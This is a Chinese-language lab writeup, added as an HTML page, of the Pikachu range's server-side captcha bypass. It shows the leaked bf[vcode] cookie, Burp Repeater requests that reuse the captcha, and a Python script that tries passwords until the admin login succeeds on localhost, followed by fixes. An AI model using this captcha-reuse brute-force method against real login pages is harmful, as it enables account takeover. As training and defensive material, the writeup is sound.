@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pikachu 服务端验证码绕过 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 750px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        h3 { font-size: 1.1rem; color: #334155; margin-top: 22px; margin-bottom: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.94em; }
+        th, td { border: 1px solid #e2e8f0; padding: 9px 12px; text-align: left; }
+        th { background: #f8fafc; color: #334155; font-weight: 600; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.05rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; margin: 18px 0; }
+        .danger { background: #fef2f2; border-left: 4px solid #ef4444; padding: 12px 16px; border-radius: 6px; color: #991b1b; margin: 18px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 Pikachu 首页</a>
+
+        <h1>Pikachu - 暴力破解 - 服务端验证码绕过</h1>
+
+        <div class="tags">
+            <span class="tag"># Pikachu</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 验证码绕过</span>
+            <span class="tag"># Burp Repeater</span>
+            <span class="tag"># Python</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>验证码绕过（on server）</li>
+            <li><strong>题目路径：</strong>Pikachu → 暴力破解 → 验证码绕过（on server）</li>
+            <li><strong>题目方向：</strong>Web - 暴力破解与验证码安全</li>
+            <li><strong>题目环境：</strong>本地部署，PHP 7.4.33 + MariaDB 10.11.19 + PHP 内置服务器</li>
+            <li><strong>访问地址：</strong><code>http://127.0.0.1/pikachu/vul/burteforce/bf_server.php</code></li>
+            <li><strong>题目目标：</strong>绕过服务端验证码校验，登录 <code>admin</code> 账号。</li>
+        </ul>
+
+        <div class="note">
+            本文章仅记录本机 Pikachu 靶场中的验证码绕过实验，不针对任何未授权系统。
+        </div>
+
+        <h2>二、漏洞原理</h2>
+        <p>页面同时提交用户名、密码和验证码：</p>
+        <pre>POST /pikachu/vul/burteforce/bf_server.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&amp;password=wrong&amp;vcode=6deci0&amp;submit=Login</pre>
+
+        <p>服务端使用 <code>$_SESSION['vcode']</code> 保存当前验证码，并将提交值与 Session 中的值比较：</p>
+        <pre>if (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {
+    $html .= "&lt;p class='notice'&gt;验证码输入错误&lt;/p&gt;";
+} else {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $sql = "select * from users where username=? and password=md5(?)";
+    // 校验用户名和密码
+}</pre>
+
+        <p>这段代码存在两个关键问题：</p>
+        <ol>
+            <li>验证码在登录失败后没有被销毁，同一个 Session 可以重复使用。</li>
+            <li>验证码生成后还会通过 Cookie 明文返回给客户端。</li>
+        </ol>
+
+        <p>查看验证码接口 <code>inc/showvcode.php</code>，可以发现：</p>
+        <pre>session_start();
+include_once 'function.php';
+
+$_SESSION['vcode'] = vcodex();
+setcookie('bf[vcode]', $_SESSION['vcode']);</pre>
+
+        <p>因此攻击者不需要识别图片，只要读取响应中的 <code>bf[vcode]</code> Cookie，就能获得真实验证码：</p>
+        <pre>Set-Cookie: bf[vcode]=6deci0; ...
+Set-Cookie: PHPSESSID=&lt;your-session-id&gt;; path=/</pre>
+
+        <div class="danger">
+            验证码必须由服务端安全保存和校验，不能将验证码值直接返回给客户端；一次验证结束后还应立即销毁。
+        </div>
+
+        <h2>三、Burp Repeater 复现</h2>
+
+        <h3>3.1 获取验证码</h3>
+        <ol>
+            <li>使用 Burp Browser 访问 <code>bf_server.php</code>。</li>
+            <li>在 <strong>Proxy → HTTP history</strong> 中找到 <code>GET /pikachu/inc/showvcode.php</code>。</li>
+            <li>查看响应头，记录 <code>PHPSESSID</code> 与 <code>bf[vcode]</code>。</li>
+        </ol>
+
+        <p>本实验中获取到的会话和验证码形式如下：</p>
+        <pre>PHPSESSID=&lt;your-session-id&gt;
+bf[vcode]=6deci0</pre>
+
+        <h3>3.2 发送错误密码</h3>
+        <p>将以下请求发送到 Repeater：</p>
+        <pre>POST /pikachu/vul/burteforce/bf_server.php HTTP/1.1
+Host: 127.0.0.1
+Cookie: PHPSESSID=&lt;your-session-id&gt;
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+username=admin&amp;password=wrong&amp;vcode=6deci0&amp;submit=Login</pre>
+
+        <p>响应中出现：</p>
+        <pre>&lt;p&gt; username or password is not exists&lt;/p&gt;</pre>
+
+        <p>这说明验证码已经通过，只是密码错误。此时验证码没有被销毁。</p>
+
+        <h3>3.3 复用验证码登录</h3>
+        <p>保持 <code>PHPSESSID</code> 和 <code>vcode</code> 不变，仅修改密码：</p>
+        <pre>username=admin&amp;password=123456&amp;vcode=6deci0&amp;submit=Login</pre>
+
+        <p>服务器返回：</p>
+        <pre>&lt;p&gt; login success&lt;/p&gt;</pre>
+
+        <table>
+            <tr><th>请求</th><th>密码</th><th>验证码</th><th>结果</th></tr>
+            <tr><td>第 1 次</td><td>wrong</td><td>6deci0</td><td>username or password is not exists</td></tr>
+            <tr><td>第 2 次</td><td>123456</td><td>6deci0</td><td>login success</td></tr>
+        </table>
+
+        <div class="flag-box">
+            username: admin<br>
+            password: 123456
+        </div>
+
+        <h2>四、Python 自动化复现</h2>
+        <p>使用 <code>requests.Session()</code> 保持会话，并从 Cookie 中读取验证码：</p>
+        <pre>import requests
+
+BASE = "http://127.0.0.1/pikachu"
+LOGIN = BASE + "/vul/burteforce/bf_server.php"
+CAPTCHA = BASE + "/inc/showvcode.php"
+
+s = requests.Session()
+s.get(LOGIN, timeout=5)
+s.get(CAPTCHA, timeout=5)
+
+sid = s.cookies.get("PHPSESSID")
+vcode = s.cookies.get("bf[vcode]")
+
+for password in ["wrong", "123456"]:
+    response = s.post(
+        LOGIN,
+        data={
+            "username": "admin",
+            "password": password,
+            "vcode": vcode,
+            "submit": "Login",
+        },
+        timeout=5,
+    )
+    print(password, "login success" in response.text)</pre>
+
+        <p>执行结果：</p>
+        <pre>wrong False
+123456 True</pre>
+
+        <p>脚本没有识别任何验证码图片，而是直接读取服务端泄露的明文验证码；随后在同一个 Session 中连续复用，直到密码正确。</p>
+
+        <h2>五、漏洞危害</h2>
+        <ul>
+            <li>验证码失去防自动化作用，无法阻止暴力破解。</li>
+            <li>攻击者可以复用同一会话和验证码进行多次密码尝试。</li>
+            <li>若登录接口没有失败次数限制，可进一步造成账号接管。</li>
+        </ul>
+
+        <h2>六、修复建议</h2>
+        <ul>
+            <li><strong>验证码仅保存在服务端：</strong>不要在 Cookie、响应正文或前端代码中返回验证码明文。</li>
+            <li><strong>验证后立即销毁：</strong>无论登录成功还是失败，都执行 <code>unset($_SESSION['vcode'])</code>。</li>
+            <li><strong>设置短有效期：</strong>验证码超过 1～5 分钟后自动失效。</li>
+            <li><strong>限制登录频率：</strong>同一账号或 IP 连续失败后增加延迟、验证码或临时锁定。</li>
+            <li><strong>使用安全随机数：</strong>验证码值应由密码学安全随机源生成。</li>
+            <li><strong>配合 MFA：</strong>敏感账号增加二次验证，降低单一口令泄露带来的风险。</li>
+        </ul>
+
+        <h2>七、总结</h2>
+        <p>本题的核心不是“破解验证码图像”，而是服务端错误地将验证码明文写入 Cookie，并且验证码在失败后没有失效。两者叠加后，验证码从防爆破机制变成了可直接读取和重复使用的普通参数。</p>
+        <p>判断此类漏洞时，重点观察三点：验证码是否来自服务端安全 Session、使用后是否立即销毁、以及是否存在登录频率限制。修复时不能只隐藏图片或增加前端校验，所有关键状态都必须由服务端维护。</p>
+    </div>
+</body>
+</html>
